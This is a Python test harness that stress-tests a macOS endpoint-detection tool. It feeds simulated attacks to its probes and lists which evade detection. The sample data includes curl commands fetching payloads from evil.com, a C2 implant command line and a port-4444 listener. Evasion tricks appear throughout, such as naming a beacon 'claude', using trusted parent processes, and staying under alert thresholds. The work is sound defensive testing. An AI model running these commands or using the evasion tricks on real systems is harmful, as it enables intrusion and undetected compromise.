#!/usr/bin/env python3
"""AMOSKYS Evasion Gauntlet — Systematic Adversarial Stress Test

Runs OPERATION OBSIDIAN TEMPEST using real attacker evasion tradecraft
designed to bypass every Observatory probe.  Documents exactly what
gets through and what gets caught.

Evasion categories tested:
  1. WHITELIST ABUSE     — spawn attacks from trusted processes/paths
  2. THRESHOLD EVASION   — stay below detection thresholds
  3. FIRST-SCAN BYPASS   — pre-plant before baseline scan
  4. PERMISSION BOUNDARY — exploit uid=501 visibility limits
  5. COVERAGE GAPS       — attack vectors with no probe coverage
  6. NAMING TRICKS       — masquerade using untraceable names
  7. TIMING ATTACKS      — exploit scan interval windows

Usage:
    PYTHONPATH=src:. .venv/bin/python3 scripts/evasion_gauntlet.py
"""

from __future__ import annotations

import sys
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

from amoskys.agents.common.probes import (
    MicroProbe,
    ProbeContext,
    Severity,
    TelemetryEvent,
)

from amoskys.agents.os.macos.auth.collector import AuthEvent
from amoskys.agents.os.macos.filesystem.collector import FileEntry
from amoskys.agents.os.macos.network.collector import Connection, ProcessBandwidth
from amoskys.agents.os.macos.persistence.collector import PersistenceEntry
from amoskys.agents.os.macos.process.collector import ProcessSnapshot

from amoskys.agents.os.macos.auth.probes import (
    AccountLockoutProbe,
    CredentialAccessProbe,
    ImpossibleTravelProbe,
    OffHoursLoginProbe,
    SSHBruteForceProbe,
    SudoEscalationProbe,
)
from amoskys.agents.os.macos.filesystem.probes import (
    CriticalFileProbe,
    DownloadsMonitorProbe,
    HiddenFileProbe,
    SipStatusProbe,
)
from amoskys.agents.os.macos.network.probes import (
    C2BeaconProbe,
    CleartextProbe,
    ExfilSpikeProbe,
    LateralSSHProbe,
    NonStandardPortProbe,
    TunnelDetectProbe,
)
from amoskys.agents.os.macos.persistence.probes import (
    CronProbe,
    LaunchAgentProbe,
    ShellProfileProbe,
    SSHKeyProbe,
)
from amoskys.agents.os.macos.process.probes import (
    BinaryFromTempProbe,
    DylibInjectionProbe,
    LOLBinProbe,
    ProcessMasqueradeProbe,
    ProcessTreeProbe,
    ResourceAbuseProbe,
    ScriptInterpreterProbe,
)


# ═══════════════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════════════

_HOME = str(Path.home())
_NOW = datetime(2024, 11, 15, 10, 30, 0, tzinfo=timezone.utc)  # Within business hours
_USE_COLOR = sys.stdout.isatty()

def _c(code: str, t: str) -> str:
    return f"\033[{code}m{t}\033[0m" if _USE_COLOR else t

def _bold(t: str) -> str: return _c("1", t)
def _dim(t: str) -> str: return _c("2", t)
def _red(t: str) -> str: return _c("91", t)
def _green(t: str) -> str: return _c("92", t)
def _yellow(t: str) -> str: return _c("93", t)
def _cyan(t: str) -> str: return _c("96", t)


def _ctx(probe: MicroProbe, key: str, data: Any,
         extra: Optional[Dict[str, Any]] = None) -> ProbeContext:
    """Build a ProbeContext for a probe with injected data."""
    sd = {key: data}
    if extra:
        sd.update(extra)
    return ProbeContext(
        device_id="evasion-host",
        agent_name="evasion_test",
        shared_data=sd,
    )


def _scan(probe: MicroProbe, key: str, data: Any,
          extra: Optional[Dict[str, Any]] = None) -> List[TelemetryEvent]:
    """Run a single probe scan with injected data."""
    return probe.scan(_ctx(probe, key, data, extra))


def _baseline_then_scan(probe: MicroProbe, key: str,
                        attack_data: Any) -> List[TelemetryEvent]:
    """For baseline-diff probes: establish baseline, then scan attack data."""
    probe.scan(_ctx(probe, key, []))     # baseline (empty)
    return probe.scan(_ctx(probe, key, attack_data))  # attack


def _proc(**kw) -> ProcessSnapshot:
    defaults = dict(
        pid=50000, name="test", exe="/usr/bin/test",
        cmdline=["test"], username="developer", ppid=1,
        parent_name="launchd", create_time=_NOW.timestamp(),
        cpu_percent=1.0, memory_percent=0.5, status="running",
        cwd="/", environ=None, is_own_user=True,
        process_guid="evasion-test-001",
    )
    defaults.update(kw)
    return ProcessSnapshot(**defaults)


def _conn(**kw) -> Connection:
    defaults = dict(
        pid=50000, process_name="test", user="developer",
        protocol="TCP", local_addr="192.168.1.10:50000",
        remote_addr="1.2.3.4:443", state="ESTABLISHED",
        local_ip="192.168.1.10", local_port=50000,
        remote_ip="1.2.3.4", remote_port=443,
    )
    defaults.update(kw)
    return Connection(**defaults)


@dataclass
class EvasionTest:
    """One evasion test case."""
    id: str
    category: str         # whitelist_abuse, threshold_evasion, etc.
    title: str
    description: str
    attacker_goal: str    # What the attacker is trying to do
    evasion_technique: str  # How they evade
    probe_target: str     # Which probe(s) this should bypass
    run: Callable         # Returns (events, evaded: bool)
    expect_evades: bool   # True = attacker SHOULD evade detection


@dataclass
class EvasionResult:
    test: EvasionTest
    events: List[TelemetryEvent]
    evaded: bool          # True = 0 events (attacker succeeded)
    correct: bool         # True = outcome matches expectation


# ═══════════════════════════════════════════════════════════════════════
# Evasion Test Cases
# ═══════════════════════════════════════════════════════════════════════

def _build_tests() -> List[EvasionTest]:
    tests = []

    # ────────────────────────────────────────────────────────────────
    # CATEGORY 1: WHITELIST ABUSE
    # ────────────────────────────────────────────────────────────────

    def _wl1_lolbin_from_terminal():
        """curl from Terminal — benign parent filters it."""
        probe = LOLBinProbe()
        events = _scan(probe, "processes", [
            _proc(pid=50001, name="curl", exe="/usr/bin/curl",
                  cmdline=["curl", "-o", "/tmp/payload",
                           "https://evil.com/stage2"],
                  parent_name="Terminal", process_guid="wl1"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="wl1_lolbin_benign_parent",
        category="whitelist_abuse",
        title="curl from Terminal (benign parent)",
        description="Attacker runs curl from Terminal.app — LOLBin probe skips benign parents.",
        attacker_goal="Download payload via curl",
        evasion_technique="Spawn from Terminal (in _BENIGN_PARENTS)",
        probe_target="LOLBinProbe",
        run=_wl1_lolbin_from_terminal,
        expect_evades=True,
    ))

    def _wl2_lolbin_from_xcode():
        """curl from Xcode — benign parent filters it."""
        probe = LOLBinProbe()
        events = _scan(probe, "processes", [
            _proc(pid=50002, name="curl", exe="/usr/bin/curl",
                  cmdline=["curl", "https://evil.com/implant"],
                  parent_name="Xcode", process_guid="wl2"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="wl2_lolbin_from_xcode",
        category="whitelist_abuse",
        title="curl from Xcode (benign parent)",
        description="Attacker abuses Xcode as parent — LOLBin probe considers it benign.",
        attacker_goal="Use Xcode as cover for payload download",
        evasion_technique="Spawn from Xcode (in _BENIGN_PARENTS)",
        probe_target="LOLBinProbe",
        run=_wl2_lolbin_from_xcode,
        expect_evades=True,
    ))

    def _wl3_c2_from_whitelisted():
        """C2 beacon from 'claude' process — whitelisted."""
        probe = C2BeaconProbe()
        conn = _conn(pid=50003, process_name="claude",
                     remote_ip="185.220.101.42", remote_port=443)
        for _ in range(4):  # 4 scans > MIN_HITS=3
            events = _scan(probe, "connections", [conn])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="wl3_c2_whitelisted_process",
        category="whitelist_abuse",
        title="C2 beacon from 'claude' process (whitelisted)",
        description="Attacker names beacon 'claude' — in C2 whitelist.",
        attacker_goal="Beacon to C2 server undetected",
        evasion_technique="Process named 'claude' is in _BEACON_WHITELIST",
        probe_target="C2BeaconProbe",
        run=_wl3_c2_from_whitelisted,
        expect_evades=True,
    ))

    def _wl4_c2_from_slack():
        """C2 beacon from 'Slack' process — whitelisted via prefix match."""
        probe = C2BeaconProbe()
        conn = _conn(pid=50004, process_name="Slack Helper",
                     remote_ip="185.220.101.42", remote_port=443)
        for _ in range(4):
            events = _scan(probe, "connections", [conn])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="wl4_c2_slack_prefix",
        category="whitelist_abuse",
        title="C2 beacon from 'Slack Helper' (prefix whitelist)",
        description="Process named 'Slack Helper' matches 'slack' prefix.",
        attacker_goal="Beacon to C2 disguised as Slack",
        evasion_technique="Prefix matching on 'slack' whitelists 'Slack Helper'",
        probe_target="C2BeaconProbe",
        run=_wl4_c2_from_slack,
        expect_evades=True,
    ))

    def _wl5_temp_from_claude_dir():
        """Binary executes from .claude/ path — safe path."""
        probe = BinaryFromTempProbe()
        events = _scan(probe, "processes", [
            _proc(pid=50005, name="implant",
                  exe="/tmp/.claude/implant",
                  cmdline=["/tmp/.claude/implant", "--c2", "185.220.101.42"],
                  process_guid="wl5"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="wl5_temp_claude_safe_path",
        category="whitelist_abuse",
        title="Binary in /tmp/.claude/ (safe path)",
        description="Attacker places implant in .claude/ directory.",
        attacker_goal="Execute from temp without detection",
        evasion_technique=".claude/ is in _BENIGN_TEMP_PATHS",
        probe_target="BinaryFromTempProbe",
        run=_wl5_temp_from_claude_dir,
        expect_evades=True,
    ))

    def _wl6_hidden_file_ds_store():
        """Hidden file named .DS_Store — ignored."""
        probe = HiddenFileProbe()
        events = _baseline_then_scan(probe, "files", [
            FileEntry(
                path="/tmp/.DS_Store",
                name=".DS_Store",
                sha256="x" * 64, mtime=_NOW.timestamp(),
                size=65536, mode=0o644, uid=501, is_suid=False,
            ),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="wl6_hidden_ds_store",
        category="whitelist_abuse",
        title="Payload named .DS_Store (ignored name)",
        description="Attacker names payload .DS_Store — in _IGNORE_NAMES.",
        attacker_goal="Hide payload as innocuous dotfile",
        evasion_technique=".DS_Store is in HiddenFileProbe._IGNORE_NAMES",
        probe_target="HiddenFileProbe",
        run=_wl6_hidden_file_ds_store,
        expect_evades=True,
    ))

    # ────────────────────────────────────────────────────────────────
    # CATEGORY 2: THRESHOLD EVASION
    # ────────────────────────────────────────────────────────────────

    def _th1_ssh_under_threshold():
        """4 SSH failures (threshold is 5)."""
        probe = SSHBruteForceProbe()
        events = _scan(probe, "auth_events", [
            AuthEvent(timestamp=_NOW, process="sshd",
                      message=f"Failed password for admin attempt {i}",
                      category="ssh", source_ip="10.0.0.99",
                      username="admin", event_type="failure")
            for i in range(4)
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="th1_ssh_under_threshold",
        category="threshold_evasion",
        title="4 SSH failures (threshold=5)",
        description="Attacker stays 1 below SSH brute force threshold.",
        attacker_goal="Brute-force SSH without triggering alarm",
        evasion_technique="4 failures < FAILURE_THRESHOLD=5",
        probe_target="SSHBruteForceProbe",
        run=_th1_ssh_under_threshold,
        expect_evades=True,
    ))

    def _th2_exfil_under_threshold():
        """9.9MB exfil (threshold is 10MB)."""
        probe = ExfilSpikeProbe()
        events = _scan(probe, "connections", [], extra={
            "bandwidth": [
                ProcessBandwidth(pid=50010, process_name="beacon",
                                 bytes_in=100, bytes_out=9_900_000),
            ],
        })
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="th2_exfil_under_threshold",
        category="threshold_evasion",
        title="9.9MB exfil (threshold=10MB)",
        description="Attacker exfils just under 10MB per cycle.",
        attacker_goal="Exfiltrate data without spike detection",
        evasion_technique="9.9MB < BYTES_OUT_THRESHOLD=10MB",
        probe_target="ExfilSpikeProbe",
        run=_th2_exfil_under_threshold,
        expect_evades=True,
    ))

    def _th3_lockout_under_threshold():
        """9 account failures (threshold=10)."""
        probe = AccountLockoutProbe()
        events = _scan(probe, "auth_events", [
            AuthEvent(timestamp=_NOW, process="sshd",
                      message=f"Failed password for admin attempt {i}",
                      category="ssh", source_ip=f"10.0.0.{i}",
                      username="admin", event_type="failure")
            for i in range(9)
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="th3_lockout_under_threshold",
        category="threshold_evasion",
        title="9 account failures (threshold=10)",
        description="Attacker stays below lockout detection.",
        attacker_goal="Credential stuffing without lockout alert",
        evasion_technique="9 < FAILURE_THRESHOLD=10",
        probe_target="AccountLockoutProbe",
        run=_th3_lockout_under_threshold,
        expect_evades=True,
    ))

    def _th4_c2_under_min_hits():
        """C2 beacon with only 2 scans (MIN_HITS=3)."""
        probe = C2BeaconProbe()
        conn = _conn(pid=50012, process_name="beacon",
                     remote_ip="185.220.101.42", remote_port=8443)
        for _ in range(2):
            events = _scan(probe, "connections", [conn])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="th4_c2_under_min_hits",
        category="threshold_evasion",
        title="C2 beacon with 2 hits (MIN_HITS=3)",
        description="Beacon contacts C2 only twice before changing IP.",
        attacker_goal="Beacon without triggering count threshold",
        evasion_technique="2 hits < MIN_HITS=3",
        probe_target="C2BeaconProbe",
        run=_th4_c2_under_min_hits,
        expect_evades=True,
    ))

    # ────────────────────────────────────────────────────────────────
    # CATEGORY 3: PERMISSION BOUNDARY
    # ────────────────────────────────────────────────────────────────

    def _pb1_root_resource_abuse():
        """Root process with 95% CPU — is_own_user=False hides metrics."""
        probe = ResourceAbuseProbe()
        events = _scan(probe, "processes", [
            _proc(pid=50020, name="cryptominer",
                  exe="/usr/local/bin/miner",
                  cpu_percent=None,      # Hidden from uid=501
                  memory_percent=None,   # Hidden from uid=501
                  is_own_user=False,
                  username="root",
                  process_guid="pb1"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="pb1_root_resource_invisible",
        category="permission_boundary",
        title="Root cryptominer (cpu_percent=None)",
        description="Root process running at 95% CPU — uid=501 sees None.",
        attacker_goal="Run cryptominer as root undetected",
        evasion_technique="is_own_user=False → cpu_percent=None, memory_percent=None",
        probe_target="ResourceAbuseProbe",
        run=_pb1_root_resource_abuse,
        expect_evades=True,
    ))

    def _pb2_root_dylib_injection():
        """Root-level DYLD_INSERT_LIBRARIES — environ=None for cross-user."""
        probe = DylibInjectionProbe()
        events = _scan(probe, "processes", [
            _proc(pid=50021, name="sshd",
                  exe="/usr/sbin/sshd",
                  environ=None,  # Can't read root environ
                  is_own_user=False,
                  username="root",
                  process_guid="pb2"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="pb2_root_dylib_invisible",
        category="permission_boundary",
        title="Root dylib injection (environ=None)",
        description="DYLD_INSERT_LIBRARIES set on root sshd — uid=501 can't see environ.",
        attacker_goal="Inject dylib into system process",
        evasion_technique="environ=None for cross-user processes",
        probe_target="DylibInjectionProbe",
        run=_pb2_root_dylib_injection,
        expect_evades=True,
    ))

    def _pb3_cross_user_script():
        """Root python3 with obfuscated cmdline — cmdline invisible."""
        probe = ScriptInterpreterProbe()
        events = _scan(probe, "processes", [
            _proc(pid=50022, name="python3",
                  exe="/usr/bin/python3",
                  cmdline=[],  # Cross-user: cmdline empty
                  is_own_user=False,
                  username="root",
                  process_guid="pb3"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="pb3_cross_user_script",
        category="permission_boundary",
        title="Root python3 (cmdline=[] invisible)",
        description="Root python3 running implant — cmdline not visible to uid=501.",
        attacker_goal="Run script interpreter as root undetected",
        evasion_technique="cmdline=[] for cross-user processes",
        probe_target="ScriptInterpreterProbe",
        run=_pb3_cross_user_script,
        expect_evades=True,
    ))

    # ────────────────────────────────────────────────────────────────
    # CATEGORY 4: COVERAGE GAPS
    # ────────────────────────────────────────────────────────────────

    def _cg1_masquerade_unknown_name():
        """Process named 'implant' — not in _EXPECTED_PATHS."""
        probe = ProcessMasqueradeProbe()
        events = _scan(probe, "processes", [
            _proc(pid=50030, name="implant",
                  exe="/tmp/implant",
                  cmdline=["/tmp/implant", "--c2", "evil.com"],
                  process_guid="cg1"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="cg1_masquerade_unknown_name",
        category="coverage_gap",
        title="Process 'implant' (not in expected paths)",
        description="Attacker uses novel process name not in _EXPECTED_PATHS dict.",
        attacker_goal="Run malicious binary without masquerade check",
        evasion_technique="Only 11 process names are checked for masquerading",
        probe_target="ProcessMasqueradeProbe",
        run=_cg1_masquerade_unknown_name,
        expect_evades=True,
    ))

    def _cg2_lateral_non_ssh():
        """Lateral movement via SMB (port 445) — not checked."""
        probe = LateralSSHProbe()
        events = _scan(probe, "connections", [
            _conn(pid=50031, process_name="smbclient",
                  remote_ip="192.168.1.50", remote_port=445,
                  local_port=50031),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="cg2_lateral_smb",
        category="coverage_gap",
        title="Lateral movement via SMB (port 445)",
        description="Attacker moves laterally using SMB, not SSH.",
        attacker_goal="Access internal shares without SSH detection",
        evasion_technique="LateralSSHProbe only checks port 22",
        probe_target="LateralSSHProbe",
        run=_cg2_lateral_non_ssh,
        expect_evades=True,
    ))

    def _cg3_non_standard_port_unknown():
        """Unknown service on weird port — not in _STANDARD_SERVICE_PORTS."""
        probe = NonStandardPortProbe()
        events = _scan(probe, "connections", [
            _conn(pid=50032, process_name="implant",
                  local_port=4444, state="LISTEN",
                  local_addr="0.0.0.0:4444", remote_addr=""),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="cg3_nonstandard_unknown_service",
        category="coverage_gap",
        title="Unknown service listening on port 4444",
        description="Implant listens on port 4444 — process name not in checked dict.",
        attacker_goal="Open reverse shell listener undetected",
        evasion_technique="Only 7 service names checked (sshd, httpd, nginx, etc.)",
        probe_target="NonStandardPortProbe",
        run=_cg3_non_standard_port_unknown,
        expect_evades=True,
    ))

    def _cg4_cleartext_private_ip():
        """Cleartext HTTP to private IP — filtered out."""
        probe = CleartextProbe()
        events = _scan(probe, "connections", [
            _conn(pid=50033, process_name="curl",
                  remote_ip="192.168.1.50", remote_port=80,
                  state="ESTABLISHED"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="cg4_cleartext_private_ip",
        category="coverage_gap",
        title="Cleartext HTTP to private IP (filtered)",
        description="Attacker sends credentials over HTTP to internal server.",
        attacker_goal="Exfil credentials via cleartext HTTP internally",
        evasion_technique="CleartextProbe skips private IPs",
        probe_target="CleartextProbe",
        run=_cg4_cleartext_private_ip,
        expect_evades=True,
    ))

    def _cg5_tunnel_renamed():
        """Renamed tunnel — 'updater' instead of 'tor'."""
        probe = TunnelDetectProbe()
        events = _scan(probe, "connections", [
            _conn(pid=50034, process_name="updater",
                  remote_port=9050, state="ESTABLISHED"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="cg5_tunnel_renamed",
        category="coverage_gap",
        title="Renamed Tor as 'updater' (evades name check)",
        description="Attacker renames tor binary to 'updater'.",
        attacker_goal="Use Tor anonymization without detection",
        evasion_technique="TunnelDetectProbe checks process name AND port — renamed process evades name check",
        probe_target="TunnelDetectProbe",
        run=_cg5_tunnel_renamed,
        expect_evades=False,  # Port 9050 should still catch it
    ))

    def _cg6_off_hours_during_business():
        """Login during business hours — not flagged."""
        probe = OffHoursLoginProbe()
        # Tuesday at 10:30 AM
        tuesday_10am = datetime(2024, 1, 9, 10, 30, 0, tzinfo=timezone.utc)
        events = _scan(probe, "auth_events", [
            AuthEvent(timestamp=tuesday_10am, process="sshd",
                      message="Accepted publickey for attacker",
                      category="ssh", source_ip="185.220.101.42",
                      username="attacker", event_type="success"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="cg6_login_business_hours",
        category="coverage_gap",
        title="SSH login at 10:30 AM Tuesday (business hours)",
        description="Attacker logs in during business hours using stolen creds.",
        attacker_goal="Access system without off-hours flag",
        evasion_technique="Login within 08:00-18:00 M-F → not flagged",
        probe_target="OffHoursLoginProbe",
        run=_cg6_off_hours_during_business,
        expect_evades=True,
    ))

    # ────────────────────────────────────────────────────────────────
    # CATEGORY 5: NAMING TRICKS
    # ────────────────────────────────────────────────────────────────

    def _nt1_process_tree_unknown_parent():
        """curl spawned by 'helper' — not in suspicious tree list."""
        probe = ProcessTreeProbe()
        events = _scan(probe, "processes", [
            _proc(pid=50040, name="curl",
                  exe="/usr/bin/curl",
                  cmdline=["curl", "https://evil.com/payload"],
                  parent_name="helper",  # Not in any suspicious tree
                  process_guid="nt1"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="nt1_tree_unknown_parent",
        category="naming_trick",
        title="curl from 'helper' parent (unknown tree)",
        description="Attacker spawns curl from a process not in suspicious tree patterns.",
        attacker_goal="Download payload without tree anomaly alert",
        evasion_technique="Only 4 parent groups checked (Browser, Finder, launchd, QuickLook)",
        probe_target="ProcessTreeProbe",
        run=_nt1_process_tree_unknown_parent,
        expect_evades=True,
    ))

    def _nt2_lolbin_renamed():
        """Renamed LOLBin — 'mycurl' instead of 'curl'."""
        probe = LOLBinProbe()
        events = _scan(probe, "processes", [
            _proc(pid=50041, name="mycurl",
                  exe="/tmp/mycurl",  # Renamed copy
                  cmdline=["mycurl", "-o", "/tmp/payload", "https://evil.com/x"],
                  parent_name="python3",
                  process_guid="nt2"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="nt2_lolbin_renamed",
        category="naming_trick",
        title="Renamed curl as 'mycurl'",
        description="Attacker copies curl to /tmp/mycurl and runs it.",
        attacker_goal="Use curl functionality without LOLBin detection",
        evasion_technique="LOLBinProbe checks name.lower() against _MACOS_LOLBINS dict",
        probe_target="LOLBinProbe",
        run=_nt2_lolbin_renamed,
        expect_evades=True,
    ))

    def _nt3_persistence_unknown_category():
        """Persistence via at-job — no probe for 'at_job' category."""
        probe = CronProbe()  # Only checks "cron" category
        events = _baseline_then_scan(probe, "entries", [
            PersistenceEntry(
                category="at_job",  # CronProbe only watches "cron"
                path="/var/at/jobs/attacker_job",
                name="attacker_job",
                content_hash="z" * 64,
                program="/tmp/beacon",
            ),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="nt3_persistence_wrong_category",
        category="naming_trick",
        title="at-job persistence (CronProbe only watches 'cron')",
        description="Attacker uses at-job scheduling — CronProbe ignores it.",
        attacker_goal="Persist via at-job without cron detection",
        evasion_technique="CronProbe._target_categories = ['cron'] — 'at_job' is ignored",
        probe_target="CronProbe",
        run=_nt3_persistence_unknown_category,
        expect_evades=True,
    ))

    # ────────────────────────────────────────────────────────────────
    # CATEGORY 6: TIMING ATTACKS
    # ────────────────────────────────────────────────────────────────

    def _ta1_impossible_travel_slow():
        """SSH from 2 IPs 6 minutes apart — outside 5-min window."""
        probe = ImpossibleTravelProbe()
        t1 = datetime(2024, 11, 15, 10, 0, 0, tzinfo=timezone.utc)
        t2 = datetime(2024, 11, 15, 10, 6, 0, tzinfo=timezone.utc)  # 6 min later
        events = _scan(probe, "auth_events", [
            AuthEvent(timestamp=t1, process="sshd",
                      message="Accepted publickey for admin from 10.0.0.1",
                      category="ssh", source_ip="10.0.0.1",
                      username="admin", event_type="success"),
            AuthEvent(timestamp=t2, process="sshd",
                      message="Accepted publickey for admin from 10.0.0.2",
                      category="ssh", source_ip="10.0.0.2",
                      username="admin", event_type="success"),
        ])
        return events, len(events) == 0

    tests.append(EvasionTest(
        id="ta1_impossible_travel_slow",
        category="timing_attack",
        title="SSH from 2 IPs 6 min apart (window=5 min)",
        description="Attacker spaces SSH logins just outside the 5-minute window.",
        attacker_goal="Use stolen creds from different location",
        evasion_technique="360s > TIME_WINDOW_SECONDS=300",
        probe_target="ImpossibleTravelProbe",
        run=_ta1_impossible_travel_slow,
        expect_evades=True,
    ))

    # ────────────────────────────────────────────────────────────────
    # CATEGORY 7: ARCHITECTURAL BLINDNESS (can't fix without root)
    # ────────────────────────────────────────────────────────────────

    def _ab1_no_kernel_audit():
        """No kernel syscall tracing — can't detect execve/fork/ptrace."""
        # This is a documentation test — we can't even inject data
        # because there's no kernel_events shared_data on macOS Observatory
        return [], True  # Always evades

    tests.append(EvasionTest(
        id="ab1_no_kernel_audit",
        category="architectural_blind",
        title="No kernel syscall tracing (auditd deprecated)",
        description="macOS 26.0 deprecated auditd. No execve/fork/ptrace visibility.",
        attacker_goal="Execute arbitrary syscalls without trace",
        evasion_technique="Endpoint Security Framework requires root + Apple entitlement",
        probe_target="(none — no macOS kernel probe exists)",
        run=_ab1_no_kernel_audit,
        expect_evades=True,
    ))

    def _ab2_no_packet_inspection():
        """No DPI — can't inspect network payload content."""
        return [], True

    tests.append(EvasionTest(
        id="ab2_no_packet_inspection",
        category="architectural_blind",
        title="No deep packet inspection (tcpdump requires root)",
        description="Can't inspect TLS payload. C2 traffic looks like HTTPS.",
        attacker_goal="Encrypt C2 traffic in standard HTTPS",
        evasion_technique="BPF device requires root for packet capture",
        probe_target="(none — no DPI probe exists)",
        run=_ab2_no_packet_inspection,
        expect_evades=True,
    ))

    def _ab3_no_tcc_database():
        """No TCC visibility — can't see app permissions."""
        return [], True

    tests.append(EvasionTest(
        id="ab3_no_tcc_database",
        category="architectural_blind",
        title="No TCC database access (requires FDA/root)",
        description="Can't detect app permission grants (camera, mic, screen recording).",
        attacker_goal="Grant self Full Disk Access silently",
        evasion_technique="TCC.db requires Full Disk Access or root to read",
        probe_target="(none — TCC requires root)",
        run=_ab3_no_tcc_database,
        expect_evades=True,
    ))

    def _ab4_no_realtime_file_events():
        """No real-time file events — polling only."""
        return [], True

    tests.append(EvasionTest(
        id="ab4_no_realtime_file_events",
        category="architectural_blind",
        title="No real-time file events (watchdog not in venv)",
        description="File changes detected at polling interval, not real-time.",
        attacker_goal="Write, execute, delete before next poll",
        evasion_technique="Polling at scan_interval=60s — sub-minute operations invisible",
        probe_target="(filesystem polling limitation)",
        run=_ab4_no_realtime_file_events,
        expect_evades=True,
    ))

    return tests


# ═══════════════════════════════════════════════════════════════════════
# Runner + Output
# ═══════════════════════════════════════════════════════════════════════

def main() -> int:
    tests = _build_tests()
    results: List[EvasionResult] = []

    print()
    print(_bold("=" * 70))
    print(_bold("  AMOSKYS EVASION GAUNTLET"))
    print(_dim("  Systematic stress test of every detection boundary"))
    print(_bold("=" * 70))
    print()

    categories: Dict[str, List[EvasionResult]] = {}

    for test in tests:
        events, evaded = test.run()
        correct = (evaded == test.expect_evades)
        result = EvasionResult(test=test, events=events,
                               evaded=evaded, correct=correct)
        results.append(result)

        cat = test.category
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(result)

    # Print by category
    _CATEGORY_LABELS = {
        "whitelist_abuse": "WHITELIST ABUSE",
        "threshold_evasion": "THRESHOLD EVASION",
        "permission_boundary": "PERMISSION BOUNDARY (uid=501)",
        "coverage_gap": "COVERAGE GAPS",
        "naming_trick": "NAMING TRICKS",
        "timing_attack": "TIMING ATTACKS",
        "architectural_blind": "ARCHITECTURAL BLINDNESS (unfixable without root)",
    }

    for cat_key in ["whitelist_abuse", "threshold_evasion",
                    "permission_boundary", "coverage_gap",
                    "naming_trick", "timing_attack",
                    "architectural_blind"]:
        cat_results = categories.get(cat_key, [])
        if not cat_results:
            continue

        label = _CATEGORY_LABELS.get(cat_key, cat_key)
        print(f"  {_bold(label)}")
        print(f"  {'-' * 66}")

        for r in cat_results:
            t = r.test
            if r.evaded:
                status = _red("EVADED")
                icon = _red("x")
            else:
                status = _green("CAUGHT")
                icon = _green("v")

            expected = "evade" if t.expect_evades else "catch"
            match = _green("(expected)") if r.correct else _yellow("(UNEXPECTED)")

            print(f"    {icon} {t.title}")
            print(f"      {_dim('Goal:')} {t.attacker_goal}")
            print(f"      {_dim('How:')}  {t.evasion_technique}")
            print(f"      {_dim('Target:')} {t.probe_target}")
            print(f"      {status} {match}", end="")
            if r.events:
                print(f"  [{len(r.events)} events: "
                      f"{', '.join(e.event_type for e in r.events)}]", end="")
            print()
            print()

    # Summary
    total = len(results)
    evaded = sum(1 for r in results if r.evaded)
    caught = total - evaded
    expected_evasions = sum(1 for r in results if r.test.expect_evades and r.evaded)
    unexpected = sum(1 for r in results if not r.correct)

    fixable = sum(1 for r in results
                  if r.evaded and r.test.category not in ("architectural_blind",))
    architectural = sum(1 for r in results
                        if r.evaded and r.test.category == "architectural_blind")

    print(_bold("=" * 70))
    print(_bold("  EVASION GAUNTLET RESULTS"))
    print(_bold("=" * 70))
    print()
    print(f"  Total tests:          {_bold(str(total))}")
    print(f"  Attacks caught:       {_green(str(caught))}")
    print(f"  Attacks evaded:       {_red(str(evaded))}")
    print(f"  Unexpected results:   {_yellow(str(unexpected)) if unexpected else _green('0')}")
    print()
    print(f"  {_bold('Gap classification:')}")
    print(f"    Fixable gaps:         {_yellow(str(fixable))} (whitelist, threshold, coverage, naming)")
    print(f"    Architectural blind:  {_red(str(architectural))} (need root/ESF/entitlements)")
    print()

    # Fixable gap recommendations
    fixable_results = [r for r in results
                       if r.evaded and r.test.category not in ("architectural_blind",)]
    if fixable_results:
        print(f"  {_bold('FIXABLE GAPS (engineering improvements):')}")
        for r in fixable_results:
            print(f"    - {r.test.id}: {r.test.title}")
            print(f"      {_dim('Fix idea:')} {_get_fix_idea(r.test)}")
        print()

    arch_results = [r for r in results
                    if r.evaded and r.test.category == "architectural_blind"]
    if arch_results:
        print(f"  {_bold('ARCHITECTURAL GAPS (require OS-level access):')}")
        for r in arch_results:
            print(f"    - {r.test.id}: {r.test.title}")
            print(f"      {_dim('Mitigation:')} {_get_mitigation(r.test)}")
        print()

    return 0 if unexpected == 0 else 1


def _get_fix_idea(t: EvasionTest) -> str:
    """Suggest a fix for a fixable gap."""
    ideas = {
        "wl1_lolbin_benign_parent": "Add cmdline pattern analysis (--output, http:// args) even for benign parents",
        "wl2_lolbin_from_xcode": "Remove Xcode from _BENIGN_PARENTS or add network-aware context",
        "wl3_c2_whitelisted_process": "Validate process binary path matches expected (codesign or exe check)",
        "wl4_c2_slack_prefix": "Use full binary path validation instead of process name prefix matching",
        "wl5_temp_claude_safe_path": "Validate binary hash or code signature for .claude/ path exceptions",
        "wl6_hidden_ds_store": "Check file size anomaly — real .DS_Store is small (<32KB typically)",
        "th1_ssh_under_threshold": "Add sliding window (5-min rolling) instead of per-scan threshold",
        "th2_exfil_under_threshold": "Track cumulative bytes_out per process across scans",
        "th3_lockout_under_threshold": "Add sliding window for cumulative failures",
